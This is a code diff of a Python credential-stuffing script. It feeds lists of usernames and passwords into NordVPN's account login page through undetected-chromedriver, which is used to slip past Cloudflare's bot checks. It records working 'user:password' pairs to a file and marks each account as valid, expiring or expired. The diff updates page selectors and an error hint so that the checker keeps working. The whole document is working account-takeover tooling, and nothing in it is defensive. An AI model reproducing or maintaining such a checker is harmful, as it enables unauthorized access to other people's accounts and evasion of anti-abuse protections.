@@ -67,6 +67,7 @@ while index != len(user):
             print("\n\nToo many errors. \n\n1) Undetected Chromedriver can't bypass Cloudflare if you are using a "
                   "blacklisted datacenter IP address. If this is the case, try changing your IP and try again. "
                   "\n\n2) Could be an unknown error related to Chrome Version. Wait a moment, and try again."
+                  "\n\n3) Make sure 'undetected-chromedriver' and the correct Chrome version is installed."
                   "\nEnding.")
             exit()
         with open(save_directory + save_file, 'a') as accounts:
@@ -128,17 +129,16 @@ while index != len(user):
             login_button.click()
             time.sleep(4)
             if 'https://my.nordaccount.com/dashboard/' in browser.current_url:
-                if browser.find_elements(By.XPATH,
-                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/div[1]/div[2]/span/div'):
+                if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/div[1]/div[2]/span/div') or browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/a/div/div[1]/div/span/div'):
                     print(" | {}:{} ---> Success! (Expiring Soon)".format(user[index], password[index]))
                     accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
                 # if browser.find_elements(By.XPATH, ':
                 # print(" | {}:{} ---> Success!".format(user[index], password[index]))
                 # accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
-                if browser.find_elements(By.XPATH,
-                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[1]/div[1]/div/div[1]/div[2]/span/div') or browser.find_elements(
+                elif browser.find_elements(By.XPATH,
+                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[1]/div/div/div/a') or browser.find_elements(
                         By.XPATH,
-                        '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[4]/div/div[1]/div[1]/div[1]/div/div[1]/div[2]/span/div'):
+                        '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[4]/div/div[1]/div[1]/div/div/div/a'):
                     print(" | {}:{} ---> Expired!".format(user[index], password[index]))
                 else:
                     print(" | {}:{} ---> No Subscription on Account".format(user[index], password[index]))
@@ -159,5 +159,3 @@ while index != len(user):
     except ContentTooShortError as c:
         print(" - Error: Url Lib Exception - Retrying")
         retries += 1
-
-
